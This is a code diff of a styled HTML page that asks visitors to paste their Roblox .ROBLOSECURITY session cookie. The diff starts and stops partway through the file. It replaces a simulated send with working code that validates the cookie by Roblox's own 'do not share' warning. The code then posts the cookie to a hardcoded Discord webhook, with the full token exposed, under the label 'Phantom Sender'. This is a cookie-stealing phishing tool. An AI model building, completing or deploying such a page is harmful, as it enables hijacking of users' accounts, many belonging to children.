@@ -12,196 +12,33 @@
       --mid-purple: #9B6BFF;
       --dark-purple: #2B0059;
       --accent: linear-gradient(135deg, #9B6BFF, #7B3FE4);
-      --glass: rgba(255, 255, 255, 0.05);
-      --border: rgba(255, 255, 255, 0.1);
-      color-scheme: dark;
+      --glass: rgba(255,255,255,0.05);
+      --border: rgba(255,255,255,0.1);
     }
-
-    * { box-sizing: border-box; }
-
-    html, body {
-      margin: 0;
-      height: 100%;
-      font-family: 'Inter', system-ui, sans-serif;
-      background: linear-gradient(180deg, var(--bg-dark) 0%, #13001a 60%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    body::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: radial-gradient(circle at 30% 20%, rgba(155, 107, 255, 0.15), transparent 50%),
-                  radial-gradient(circle at 70% 80%, rgba(234, 217, 255, 0.1), transparent 50%);
-      pointer-events: none;
-      z-index: -1;
-    }
-
-    .wrap {
-      width: min(480px, 92vw);
-      padding: 36px 32px;
-      border-radius: 24px;
-      background: var(--glass);
-      backdrop-filter: blur(12px);
-      border: 1px solid var(--border);
-      box-shadow: 
-        0 16px 48px rgba(43, 0, 89, 0.4),
-        0 0 0 1px rgba(155, 107, 255, 0.1);
-      position: relative;
-      overflow: hidden;
-      animation: fadeIn 0.6s ease-out;
-    }
-
-    .wrap::before {
-      content: '';
-      position: absolute;
-      top: -50%; left: -50%;
-      width: 200%; height: 200%;
-      background: conic-gradient(from 0deg, transparent, rgba(155, 107, 255, 0.1), transparent);
-      animation: rotate 20s linear infinite;
-      pointer-events: none;
-      opacity: 0.3;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes rotate {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-    }
-
-    h1 {
-      margin: 0 0 10px 0;
-      font-size: 36px;
-      font-weight: 800;
-      background: var(--accent);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      text-align: center;
-      letter-spacing: -0.5px;
-    }
-
-    .subtitle {
-      text-align: center;
-      color: #d8caff;
-      margin-bottom: 28px;
-      font-size: 15px;
-      opacity: 0.9;
-    }
-
-    label {
-      color: #e5daff;
-      font-size: 14px;
-      font-weight: 600;
-      margin: 16px 0 8px;
-      display: block;
-      transition: color 0.2s;
-    }
-
-    .input-wrapper {
-      position: relative;
-    }
-
-    input, textarea {
-      width: 100%;
-      padding: 14px 16px;
-      border-radius: 14px;
-      border: 1px solid var(--border);
-      background: rgba(255, 255, 255, 0.06);
-      color: #fff;
-      font-size: 15px;
-      outline: none;
-      transition: all 0.3s ease;
-      backdrop-filter: blur(4px);
-    }
-
-    input:focus, textarea:focus {
-      border: 1px solid var(--mid-purple);
-      background: rgba(255, 255, 255, 0.1);
-      box-shadow: 0 0 0 4px rgba(155, 107, 255, 0.2);
-      transform: translateY(-1px);
-    }
-
-    textarea {
-      resize: none;
-      height: 120px;
-      font-family: inherit;
-    }
-
-    button {
-      margin-top: 26px;
-      width: 100%;
-      padding: 16px;
-      border-radius: 16px;
-      border: none;
-      background: var(--accent);
-      color: white;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 10px 30px rgba(155, 107, 255, 0.3);
-      transition: all 0.25s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    button::before {
-      content: '';
-      position: absolute;
-      top: 0; left: -100%;
-      width: 100%; height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: 0.6s;
-    }
-
-    button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 16px 40px rgba(155, 107, 255, 0.4);
-    }
-
-    button:hover::before {
-      left: 100%;
-    }
-
-    button:active {
-      transform: translateY(-1px);
-    }
-
-    button.loading {
-      animation: pulse 1.5s infinite;
-      pointer-events: none;
-      opacity: 0.9;
-    }
-
-    .status {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 14px;
-      color: #d3c2ff;
-      min-height: 22px;
-      font-weight: 500;
-      transition: opacity 0.3s;
-    }
-
-    .success { color: #a8ffbc; }
-    .error { color: #ffb3b3; }
-
-    @media (max-width: 480px) {
-      .wrap { padding: 28px 24px; }
-      h1 { font-size: 32px; }
-    }
+    *{box-sizing:border-box}
+    html,body{margin:0;height:100%;font-family:'Inter',system-ui,sans-serif;background:linear-gradient(180deg,var(--bg-dark) 0%,#13001a 60%);display:flex;align-items:center;justify-content:center;overflow:hidden}
+    body::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,rgba(155,107,255,.15),transparent 50%),radial-gradient(circle at 70% 80%,rgba(234,217,255,.1),transparent 50%);pointer-events:none;z-index:-1}
+    .wrap{width:min(480px,92vw);padding:36px 32px;border-radius:24px;background:var(--glass);backdrop-filter:blur(12px);border:1px solid var(--border);box-shadow:0 16px 48px rgba(43,0,89,.4),0 0 0 1px rgba(155,107,255,.1);position:relative;overflow:hidden;animation:fadeIn .6s ease-out}
+    .wrap::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(155,107,255,.1),transparent);animation:rotate 20s linear infinite;pointer-events:none;opacity:.3}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+    @keyframes rotate{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+    @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+    h1{margin:0 0 10px;font-size:36px;font-weight:800;background:var(--accent);-webkit-background-clip:text;background-clip:text;color:transparent;text-align:center;letter-spacing:-.5px}
+    .subtitle{text-align:center;color:#d8caff;margin-bottom:28px;font-size:15px;opacity:.9}
+    label{color:#e5daff;font-size:14px;font-weight:600;margin:16px 0 8px;display:block;transition:color .2s}
+    .input-wrapper{position:relative}
+    textarea{width:100%;padding:14px 16px;border-radius:14px;border:1px solid var(--border);background:rgba(255,255,255,.06);color:#fff;font-size:15px;outline:none;transition:all .3s ease;backdrop-filter:blur(4px);resize:none;height:120px;font-family:inherit}
+    textarea:focus{border:1px solid var(--mid-purple);background:rgba(255,255,255,.1);box-shadow:0 0 0 4px rgba(155,107,255,.2);transform:translateY(-1px)}
+    button{margin-top:26px;width:100%;padding:16px;border-radius:16px;border:none;background:var(--accent);color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 10px 30px rgba(155,107,255,.3);transition:all .25s ease;position:relative;overflow:hidden}
+    button::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);transition:.6s}
+    button:hover{transform:translateY(-3px);box-shadow:0 16px 40px rgba(155,107,255,.4)}
+    button:hover::before{left:100%}
+    button:active{transform:translateY(-1px)}
+    button.loading{animation:pulse 1.5s infinite;pointer-events:none;opacity:.9}
+    .status{text-align:center;margin-top:18px;font-size:14px;color:#d3c2ff;min-height:22px;font-weight:500;transition:opacity .3s}
+    .success{color:#a8ffbc}
+    .error{color:#ffb3b3}
+    @media(max-width:480px){.wrap{padding:28px 24px}h1{font-size:32px}}
   </style>
 </head>
 <body>
@@ -214,72 +51,80 @@
       <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here..." required></textarea>
     </div>
 
-    <button id="sendBtn">
-      <span class="btn-text">Send Cookie</span>
-    </button>
-
+    <button id="sendBtn"><span class="btn-text">Send Cookie</span></button>
     <div id="status" class="status"></div>
   </div>
 
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1437587172520890368/pHODyH2kixWv5p31WAPMjx9EXzsvIBJvxZW0Oni-4DVN97gYOoPw5krm9rHnsJ-MBdct";
     const cookieInput = document.getElementById('cookie');
     const statusEl = document.getElementById('status');
     const btn = document.getElementById('sendBtn');
     const btnText = btn.querySelector('.btn-text');
 
+    // ---- Validation -------------------------------------------------
+    function isValidRobloxCookie(str) {
+      return /_\|WARNING:-DO-NOT-SHARE-THIS/.test(str.trim());
+    }
+
+    // ---- UI feedback ------------------------------------------------
+    function showStatus(msg, type = '') {
+      statusEl.textContent = msg;
+      statusEl.className = `status ${type}`;
+      btnText.textContent = type === 'loading' ? 'Sending...' : 'Send Cookie';
+    }
+
+    // ---- Send to Discord --------------------------------------------
     async function sendCookie() {
-      const cookie = cookieInput.value.trim();
-      if (!cookie) {
-        showStatus("Please paste a Roblox cookie.", "error");
-        return;
+      const raw = cookieInput.value;
+      if (!raw) return showStatus('Please paste a cookie.', 'error');
+
+      if (!isValidRobloxCookie(raw)) {
+        return showStatus('Invalid Roblox cookie – missing warning string.', 'error');
       }
 
-      if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
-        showStatus("This doesn't look like a valid Roblox cookie.", "error");
-        return;
-      }
-
-      showStatus("Sending...", "loading");
+      showStatus('Sending...', 'loading');
       btn.classList.add('loading');
       btn.disabled = true;
 
       try {
-        // Simulate sending (replace with actual endpoint if needed)
-        await new Promise(r => setTimeout(r, 1500));
-        
-        // Example POST request (uncomment and modify if you have a backend)
-        /*
-        const res = await fetch('YOUR_BACKEND_ENDPOINT', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cookie })
-        });
-        */
+        const payload = {
+          content: null,
+          embeds: [{
+            title: "Roblox Cookie Received",
+            description: "```" + raw.substring(0, 1900) + "```", // Discord limit ~2000 chars
+            color: 0x9B6BFF,
+            timestamp: new Date().toISOString(),
+            footer: { text: "Phantom Sender" }
+          }]
+        };
 
-        showStatus("✅ Cookie sent successfully!", "success");
-        cookieInput.value = "";
+        const res = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          showStatus('Cookie sent successfully!', 'success');
+          cookieInput.value = '';
+        } else {
+          const err = await res.text();
+          showStatus('Failed to send – webhook error.', 'error');
+          console.error('Webhook error:', err);
+        }
       } catch (e) {
-        showStatus("❌ Failed to send — try again.", "error");
+        showStatus('Network error – try again.', 'error');
+        console.error(e);
       } finally {
         btn.classList.remove('loading');
         btn.disabled = false;
       }
     }
 
-    function showStatus(message, type) {
-      statusEl.textContent = message;
-      statusEl.className = `status ${type || ''}`;
-      if (type === 'loading') {
-        btnText.textContent = 'Sending...';
-      } else {
-        btnText.textContent = 'Send Cookie';
-      }
-    }
-
+    // ---- Event listeners --------------------------------------------
     btn.addEventListener('click', sendCookie);
-
-    // Optional: Allow Enter+Shift to send
-    cookieInput.addEventListener('keydown', (e) => {
+    cookieInput.addEventListener('keydown', e => {
       if (e.key === 'Enter' && e.shiftKey) {
         e.preventDefault();
         sendCookie();
